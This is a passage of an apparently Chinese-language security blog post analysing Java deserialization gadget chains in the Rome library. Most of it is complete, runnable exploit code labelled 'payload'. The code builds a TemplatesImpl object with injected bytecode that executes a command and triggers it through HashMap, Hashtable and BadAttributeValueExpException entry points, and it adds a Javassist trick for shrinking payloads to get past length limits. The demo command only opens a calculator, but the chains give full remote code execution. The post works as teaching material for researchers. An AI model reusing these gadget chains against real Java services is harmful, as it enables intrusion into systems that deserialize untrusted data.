main(String[] args) throws Exception &#123;</span><br><span class="line">        // 将恶意类的字节码文件存入字节数组</span><br><span class="line">        byte[] bytecodes = Files.readAllBytes(Paths.get(&quot;C:\\Users\\miaoj\\Documents\\Java安全代码实验\\Rome利用链分析\\RomeTest\\target\\classes\\Eval.class&quot;));</span><br><span class="line"></span><br><span class="line">        // 新建利用链 TemplatesImpl 对象</span><br><span class="line">        TemplatesImpl templatesImpl = new TemplatesImpl();</span><br><span class="line">        setValue(templatesImpl,&quot;_name&quot;,&quot;aaa&quot;);</span><br><span class="line">        setValue(templatesImpl,&quot;_bytecodes&quot;,new byte[][] &#123;bytecodes&#125;);</span><br><span class="line">        setValue(templatesImpl, &quot;_tfactory&quot;, new TransformerFactoryImpl());</span><br><span class="line"></span><br><span class="line">        // 利用 ToStringBean 的 toString() 方法调用 TemplatesImpl 的 getOutputProperties() 方法</span><br><span class="line">        ToStringBean toStringBean = new ToStringBean(Templates.class,templatesImpl);</span><br><span class="line"></span><br><span class="line">        // 利用 EqualsBean 的 beanHashCode() 方法调用 ToStringBean 的 toString() 方法</span><br><span class="line">        EqualsBean equalsBean = new EqualsBean(ToStringBean.class, toStringBean);</span><br><span class="line"></span><br><span class="line">        // 利用 ObjectBean 的 hashCode() 方法调用 EqualsBean 的 beanHashCode() 方法</span><br><span class="line">        ObjectBean objectBean = new ObjectBean(EqualsBean.class, equalsBean);</span><br><span class="line"></span><br><span class="line">        // HashMap 的 hash() 方法会调用 key 的 hashCode() 方法，readObject() 方法会调用 hash() 方法</span><br><span class="line">        HashMap hashMap = new HashMap(1);</span><br><span class="line">        // 先存入无关数据</span><br><span class="line">        hashMap.put(&quot;test1&quot;, &quot;test2&quot;);</span><br><span class="line">        // 反射获取 table 属性</span><br><span class="line">        Object[] table= (Object[]) getValue(hashMap,&quot;table&quot;);</span><br><span class="line">        // 获取 table 数组中的 Node 对象</span><br><span class="line">        Object entry = table[1];</span><br><span class="line">        // 反射修改 Node 对象的 key 属性值</span><br><span class="line">        setValue(entry,&quot;key&quot;,objectBean);</span><br><span class="line"></span><br><span class="line">        // 序列化成字节数组</span><br><span class="line">        ByteArrayOutputStream baos = new ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = new ObjectOutputStream(baos);</span><br><span class="line">        oos.writeObject(hashMap);</span><br><span class="line">        oos.flush();</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        // 反序列化字节数组</span><br><span class="line">        ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray());</span><br><span class="line">        ObjectInputStream ois = new ObjectInputStream(bais);</span><br><span class="line">        ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 反射设置属性值的过程可以抽离成一个方法</span><br><span class="line">    public static void setValue(Object obj, String name, Object value) throws Exception&#123;</span><br><span class="line">        Field field = obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(true);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static Object getValue(Object obj, String name) throws Exception&#123;</span><br><span class="line">        Field field = obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(true);</span><br><span class="line">        return field.get(obj);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>不过值得注意的是，这里获取到的 table 数组其中存储的 Node&lt;K,V&gt; 对象不一定是按顺序来的，不想看算法的话直接调试来看位置：</p><img src="/images/image-20240606172727041.png"><p>可以看到，这里键值对是存入了 table 数组中下标为 1 的位置，而且我们初始化时设定容量为 1 ，但是实际的 table 大小为 2 。所以这里建议不管有没有设置初始容量，都要具体情况具体分析，调试起来确定下标后再修改。</p><h2 id="使用-Javassist-缩短字节码文件"><a href="#使用-Javassist-缩短字节码文件" class="headerlink" title="使用 Javassist 缩短字节码文件"></a>使用 Javassist 缩短字节码文件</h2><p>在某些情况下，网站可能会对反序列化数据的长度有一定限制，所以有必要通过一些手段来缩短 Payload 。</p><p>有关 Javassist 的知识参见：<a href="https://changeyourway.github.io/2024/06/07/Java%20%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E7%AF%87-javassist%E7%94%A8%E6%B3%95%E6%8C%87%E5%8D%97/">基础篇 - Javassist 使用指南</a> </p><p>前面我们用来被加载的 Eval 类是这样的：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">public class Eval extends AbstractTranslet &#123;</span><br><span class="line">    // 恶意代码放在静态代码块中</span><br><span class="line">    static &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Runtime.getRuntime().exec(&quot;calc&quot;);</span><br><span class="line">        &#125; catch (IOException e) &#123;</span><br><span class="line">            throw new RuntimeException(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 需要重写父类的两个方法</span><br><span class="line">    @Override</span><br><span class="line">    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由于 TemplatesImpl#defineTransletClasses() 方法会判断被加载的类是否继承了 AbstractTranslet ，如果没有就抛出异常，所以 Eval 类被迫继承了 AbstractTranslet ，又由于 AbstractTranslet 是个抽象类，继承了它就要重写它的一些方法，否则编译器报错。但其实这两个方法根本就没有用，造成了冗余。</p><p>可以用 javassist 来构建这样一个类，用 javassist 来操作字节码，添加静态代码块，继承父类，而不需要实现父类的方法，具体办法如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">// 获取类池</span><br><span class="line">ClassPool classPool = ClassPool.getDefault();</span><br><span class="line">// 创建一个名为 Error 的类</span><br><span class="line">CtClass error = classPool.makeClass(&quot;Error&quot;);</span><br><span class="line">// 向 Error 对象中添加静态代码块</span><br><span class="line">CtConstructor constructor = error.makeClassInitializer();</span><br><span class="line">constructor.setBody(&quot;Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;);</span><br><span class="line">// 设置 Error 的父类为 AbstractTranslet</span><br><span class="line">CtClass abstractTranslet = classPool.get(&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;);</span><br><span class="line">error.setSuperclass(abstractTranslet);</span><br><span class="line">// 将 Error 对象输出成字节数组</span><br><span class="line">byte[] errorBytecode = error.toBytecode();</span><br></pre></td></tr></table></figure><p>这样创建的对象中没有重写父类 AbstractTranslet 的两个方法，缩短了字节码长度。以后再也不用手写 Eval 类了。</p><h2 id="变种利用链分析"><a href="#变种利用链分析" class="headerlink" title="变种利用链分析"></a>变种利用链分析</h2><p>核心依然是 TemplatesImpl#getOutputProperties() 。后面的 payload 统一用 javassist 来创建类。</p><h4 id="EqualsBean-hashCode-链"><a href="#EqualsBean-hashCode-链" class="headerlink" title="EqualsBean#hashCode() 链"></a>EqualsBean#hashCode() 链</h4><p>用 EqualsBean#hashCode() 替换掉 ObjectBean#hashCode() 即可。</p><p>EqualsBean#hashCode() 内容如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public int hashCode() &#123;</span><br><span class="line">    return beanHashCode();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h6 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line">import com.sun.syndication.feed.impl.EqualsBean;</span><br><span class="line">import com.sun.syndication.feed.impl.ObjectBean;</span><br><span class="line">import com.sun.syndication.feed.impl.ToStringBean;</span><br><span class="line">import javassist.ClassPool;</span><br><span class="line">import javassist.CtClass;</span><br><span class="line">import javassist.CtConstructor;</span><br><span class="line"></span><br><span class="line">import javax.xml.transform.Templates;</span><br><span class="line">import java.io.ByteArrayInputStream;</span><br><span class="line">import java.io.ByteArrayOutputStream;</span><br><span class="line">import java.io.ObjectInputStream;</span><br><span class="line">import java.io.ObjectOutputStream;</span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.nio.file.Files;</span><br><span class="line">import java.nio.file.Paths;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line"></span><br><span class="line">public class EqualsBean_payload &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        // 获取类池</span><br><span class="line">        ClassPool classPool = ClassPool.getDefault();</span><br><span class="line">        // 创建一个名为 Error 的类</span><br><span class="line">        CtClass error = classPool.makeClass(&quot;Error&quot;);</span><br><span class="line">        // 向 Error 对象中添加静态代码块</span><br><span class="line">        CtConstructor constructor = error.makeClassInitializer();</span><br><span class="line">        constructor.setBody(&quot;Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;);</span><br><span class="line">        // 设置 Error 的父类为 AbstractTranslet</span><br><span class="line">        CtClass abstractTranslet = classPool.get(&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;);</span><br><span class="line">        error.setSuperclass(abstractTranslet);</span><br><span class="line">        // 将 Error 对象输出成字节数组</span><br><span class="line">        byte[] errorBytecode = error.toBytecode();</span><br><span class="line"></span><br><span class="line">        // 新建利用链 TemplatesImpl 对象</span><br><span class="line">        TemplatesImpl templatesImpl = new TemplatesImpl();</span><br><span class="line">        setValue(templatesImpl, &quot;_name&quot;, &quot;aaa&quot;);</span><br><span class="line">        setValue(templatesImpl, &quot;_bytecodes&quot;, new byte[][]&#123;errorBytecode&#125;);</span><br><span class="line">        setValue(templatesImpl, &quot;_tfactory&quot;, new TransformerFactoryImpl());</span><br><span class="line"></span><br><span class="line">        // 利用 ToStringBean 的 toString() 方法调用 TemplatesImpl 的 getOutputProperties() 方法</span><br><span class="line">        ToStringBean toStringBean = new ToStringBean(Templates.class, templatesImpl);</span><br><span class="line"></span><br><span class="line">        // EqualsBean 的 beanHashCode() 方法会调用其成员属性 _obj 的 toString() 方法</span><br><span class="line">        // EqualsBean 的 HashCode() 方法又会调用 beanHashCode() 方法</span><br><span class="line">        // 为防止调用 put 方法时提前命令执行，先传入一个普通的 EqualsBean</span><br><span class="line">        HashMap hashMapNull = new HashMap();</span><br><span class="line">        EqualsBean equalsBean = new EqualsBean(HashMap.class, hashMapNull);</span><br><span class="line"></span><br><span class="line">        // HashMap 的 hash() 方法会调用 key 的 hashCode() 方法，readObject() 方法会调用 hash() 方法</span><br><span class="line">        HashMap hashMap = new HashMap();</span><br><span class="line">        hashMap.put(equalsBean, &quot;test&quot;);</span><br><span class="line"></span><br><span class="line">        // 反射修改 ObjectBean 的属性值</span><br><span class="line">        setValue(equalsBean, &quot;_obj&quot;, toStringBean);</span><br><span class="line"></span><br><span class="line">        // 序列化成字节数组</span><br><span class="line">        ByteArrayOutputStream baos = new ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = new ObjectOutputStream(baos);</span><br><span class="line">        oos.writeObject(hashMap);</span><br><span class="line">        oos.flush();</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        // 反序列化字节数组</span><br><span class="line">        ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray());</span><br><span class="line">        ObjectInputStream ois = new ObjectInputStream(bais);</span><br><span class="line">        ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 反射设置属性值的过程可以抽离成一个方法</span><br><span class="line">    public static void setValue(Object obj, String name, Object value) throws Exception &#123;</span><br><span class="line">        Field field = obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(true);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="HashTable-链"><a href="#HashTable-链" class="headerlink" title="HashTable 链"></a>HashTable 链</h4><p>入口类改用 HashTable 即可。</p><p>调用链如下：</p><ol><li>Hashtable#readObject()</li><li>Hashtable#reconstitutionPut()</li><li>EqualsBean#hashCode()</li></ol><p>Hashtable 的 reconstitutionPut() 方法会调用 key 的 hashCode() 方法：</p><img src="/images/image-20240606093903510.png"><h6 id="payload-1"><a href="#payload-1" class="headerlink" title="payload"></a>payload</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line">import com.sun.syndication.feed.impl.EqualsBean;</span><br><span class="line">import com.sun.syndication.feed.impl.ToStringBean;</span><br><span class="line">import javassist.ClassPool;</span><br><span class="line">import javassist.CtClass;</span><br><span class="line">import javassist.CtConstructor;</span><br><span class="line"></span><br><span class="line">import javax.xml.transform.Templates;</span><br><span class="line">import java.io.ByteArrayInputStream;</span><br><span class="line">import java.io.ByteArrayOutputStream;</span><br><span class="line">import java.io.ObjectInputStream;</span><br><span class="line">import java.io.ObjectOutputStream;</span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.nio.file.Files;</span><br><span class="line">import java.nio.file.Paths;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.Hashtable;</span><br><span class="line"></span><br><span class="line">public class Hashtable_payload &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        // 获取类池</span><br><span class="line">        ClassPool classPool = ClassPool.getDefault();</span><br><span class="line">        // 创建一个名为 Error 的类</span><br><span class="line">        CtClass error = classPool.makeClass(&quot;Error&quot;);</span><br><span class="line">        // 向 Error 对象中添加静态代码块</span><br><span class="line">        CtConstructor constructor = error.makeClassInitializer();</span><br><span class="line">        constructor.setBody(&quot;Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;);</span><br><span class="line">        // 设置 Error 的父类为 AbstractTranslet</span><br><span class="line">        CtClass abstractTranslet = classPool.get(&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;);</span><br><span class="line">        error.setSuperclass(abstractTranslet);</span><br><span class="line">        // 将 Error 对象输出成字节数组</span><br><span class="line">        byte[] errorBytecode = error.toBytecode();</span><br><span class="line"></span><br><span class="line">        // 新建利用链 TemplatesImpl 对象</span><br><span class="line">        TemplatesImpl templatesImpl = new TemplatesImpl();</span><br><span class="line">        setValue(templatesImpl, &quot;_name&quot;, &quot;aaa&quot;);</span><br><span class="line">        setValue(templatesImpl, &quot;_bytecodes&quot;, new byte[][]&#123;errorBytecode&#125;);</span><br><span class="line">        setValue(templatesImpl, &quot;_tfactory&quot;, new TransformerFactoryImpl());</span><br><span class="line"></span><br><span class="line">        // 利用 ToStringBean 的 toString() 方法调用 TemplatesImpl 的 getOutputProperties() 方法</span><br><span class="line">        ToStringBean toStringBean = new ToStringBean(Templates.class, templatesImpl);</span><br><span class="line"></span><br><span class="line">        // EqualsBean 的 beanHashCode() 方法会调用其成员属性 _obj 的 toString() 方法</span><br><span class="line">        // EqualsBean 的 HashCode() 方法又会调用 beanHashCode() 方法</span><br><span class="line">        // 为防止调用 put 方法时提前命令执行，先传入一个普通的 EqualsBean</span><br><span class="line">        HashMap hashMapNull = new HashMap();</span><br><span class="line">        EqualsBean equalsBean = new EqualsBean(HashMap.class, hashMapNull);</span><br><span class="line"></span><br><span class="line">        // Hashtable 的 reconstitutionPut() 方法会调用 key 的 hashCode() 方法</span><br><span class="line">        // Hashtable 的 readObject() 方法会调用 reconstitutionPut() 方法</span><br><span class="line">        Hashtable&lt;Object, Object&gt; hashtable = new Hashtable&lt;&gt;();</span><br><span class="line">        hashtable.put(equalsBean, &quot;test&quot;);</span><br><span class="line"></span><br><span class="line">        // 反射修改 ObjectBean 的属性值</span><br><span class="line">        setValue(equalsBean, &quot;_obj&quot;, toStringBean);</span><br><span class="line"></span><br><span class="line">        // 序列化成字节数组</span><br><span class="line">        ByteArrayOutputStream baos = new ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = new ObjectOutputStream(baos);</span><br><span class="line">        oos.writeObject(hashtable);</span><br><span class="line">        oos.flush();</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        // 反序列化字节数组</span><br><span class="line">        ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray());</span><br><span class="line">        ObjectInputStream ois = new ObjectInputStream(bais);</span><br><span class="line">        ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 反射设置属性值的过程可以抽离成一个方法</span><br><span class="line">    public static void setValue(Object obj, String name, Object value) throws Exception &#123;</span><br><span class="line">        Field field = obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(true);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="BadAttributeValueExpException-链"><a href="#BadAttributeValueExpException-链" class="headerlink" title="BadAttributeValueExpException 链"></a>BadAttributeValueExpException 链</h4><p>入口类改用 BadAttributeValueExpException 即可。CC5 链便是将这个类作为入口，不妨再复习一下。</p><p>BadAttributeValueExpException 的 readObject 方法调用了 valObj 的 toString 方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException &#123;</span><br><span class="line">// valObj 是从输入流中读取到的对象的 val 字段值</span><br><span class="line">    ObjectInputStream.GetField gf = ois.readFields();</span><br><span class="line">    Object valObj = gf.get(&quot;val&quot;, null);</span><br><span class="line"></span><br><span class="line">    if (valObj == null) &#123;</span><br><span class="line">        val = null;</span><br><span class="line">    &#125; else if (valObj instanceof String) &#123;</span><br><span class="line">        val= valObj;</span><br><span class="line">    &#125; else if (System.getSecurityManager() == null</span><br><span class="line">            || valObj instanceof Long</span><br><span class="line">            || valObj instanceof Integer</span><br><span class="line">            || valObj instanceof Float</span><br><span class="line">            || valObj instanceof Double</span><br><span class="line">            || valObj instanceof Byte</span><br><span class="line">            || valObj instanceof Short</span><br><span class="line">            || valObj instanceof Boolean) &#123;</span><br><span class="line">        // 这里调用了 valObj 的 toString 方法</span><br><span class="line">        val = valObj.toString();</span><br><span class="line">    &#125; else &#123; // the serialized object is from a version without JDK-8019292 fix</span><br><span class="line">        val = System.identityHashCode(valObj) + &quot;@&quot; + valObj.getClass().getName();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>valObj 是从输入流中读取到的对象的 val 字段值，即 BadAttributeValueExpException 对象的 val 属性值。</p><p>不能用构造方法给 val 赋值，因为构造方法会提前调用 val 的 toString 方法，造成命令执行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public BadAttributeValueExpException (Object val) &#123;</span><br><span class="line">    this.val = val == null ? null : val.toString();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以这里选择反射修改 val 的值，将 val 的值设置成 ToStringBean 对象即可。</p><h6 id="payload-2"><a href="#payload-2" class="headerlink" title="payload"></a>payload</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line">import com.sun.syndication.feed.impl.ToStringBean;</span><br><span class="line">import javassist.ClassPool;</span><br><span class="line">import javassist.CtClass;</span><br><span class="line">import javassist.CtConstructor;</span><br><span class="line"></span><br><span class="line">import javax.management.BadAttributeValueExpException;</span><br><span class="line">import javax.xml.transform.Templates;</span><br><span class="line">import java.io.ByteArrayInputStream;</span><br><span class="line">import java.io.ByteArrayOutputStream;</span><br><span class="line">import java.io.ObjectInputStream;</span><br><span class="line">import java.io.ObjectOutputStream;</span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.nio.file.Files;</span><br><span class="line">import java.nio.file.Paths;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line"></span><br><span class="line">public class BadAttributeValueExpException_payload &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        // 获取类池</span><br><span class="line">        ClassPool classPool = ClassPool.getDefault();</span><br><span class="line">        // 创建一个名为 Error 的类</span><br><span class="line">        CtClass error = classPool.makeClass(&quot;Error&quot;);</span><br><span class="line">        // 向 Error 对象中添加静态代码块</span><br><span class="line">        CtConstructor constructor = error.makeClassInitializer();</span><br><span class="line">        constructor.setBody(&quot;Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;);</span><br><span class="line">        // 设置 Error 的父类为 AbstractTranslet</span><br><span class="line">        CtClass abstractTranslet = classPool.get(&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;);</span><br><span class="line">        error.setSuperclass(abstractTranslet);</span><br><span class="line">        // 将 Error 对象输出成字节数组</span><br><span class="line">        byte[] errorBytecode = error.toBytecode();</span><br><span class="line"></span><br><span class="line">        // 新建利用链 TemplatesImpl 对象</span><br><span class="line">        TemplatesImpl templatesImpl = new TemplatesImpl();</span><br><span class="line">        setValue(templatesImpl, &quot;_name&quot;, &quot;aaa&quot;);</span><br><span class="line">        setValue(templatesImpl, &quot;_bytecodes&quot;, new byte[][]&#123;errorBytecode&#125;);</span><br><span class="line">        setValue(templatesImpl, &quot;_tfactory&quot;, new TransformerFactoryImpl());</span><br><span class="line"></span><br><span class="line">        // 利用 ToStringBean 的 toString() 方法调用 TemplatesImpl 的 getOutputProperties() 方法</span><br><span class="line">        ToStringBean toStringBean = new ToStringBean(Templates.class, templatesImpl);</span><br><span class="line"></span><br><span class="line">        // BadAttributeValueExpException 的 readObject 方法会调用 val 属性的 toString 方法</span><br><span class="line">        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(new HashMap());</span><br><span class="line">        // 为防止调用构造方法命令执行，选择反射修改 val 属性值</span><br><span class="line">        setValue(badAttributeValueExpException, &quot;val&quot;, toStringBean);</span><br><span class="line"></span><br><span class="line">        // 序列化成字节数组</span><br><span class="line">        ByteArrayOutputStream baos = new ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = new ObjectOutputStream(baos);</span><br><span class="line">        oos.writeObject(badAttributeValueExpException);</span><br><span class="line">        oos.flush();</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        // 反序列化字节数组</span><br><span class="line">        ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray());</span><br><span class="line">        ObjectInputStream ois = new ObjectInputStream(bais);</span><br><span class="line">        ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 反射设置属性值的过程可以抽离成一个方法</span><br><span class="line">    public static void setValue(Object obj, String name, Object value) throws Exception &#123;</span><br><span class="line">        Field field = obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(true);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span 